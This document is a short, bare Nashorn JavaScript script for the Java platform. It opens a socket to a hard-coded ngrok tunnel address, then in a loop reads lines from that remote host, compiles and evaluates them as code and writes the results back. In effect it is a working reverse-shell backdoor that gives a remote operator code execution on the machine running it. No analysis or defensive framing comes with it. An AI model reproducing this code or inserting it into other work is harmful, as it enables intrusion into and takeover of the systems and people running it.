var sock = new java.net.Socket("4.tcp.eu.ngrok.io", 17544);
if (sock.isConnected())
{
  var input = new java.io.BufferedReader(new java.io.InputStreamReader(sock.getInputStream()));
  var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream()));
  var engine = new javax.script.ScriptEngineManager().getEngineByName("Nashorn");

  while (sock.isConnected()) {
    var payload = input.readLine();
    engine.compile(payload).eval();
    output.write(engine.invokeFunction("exec"));
    output.flush();
  }
}
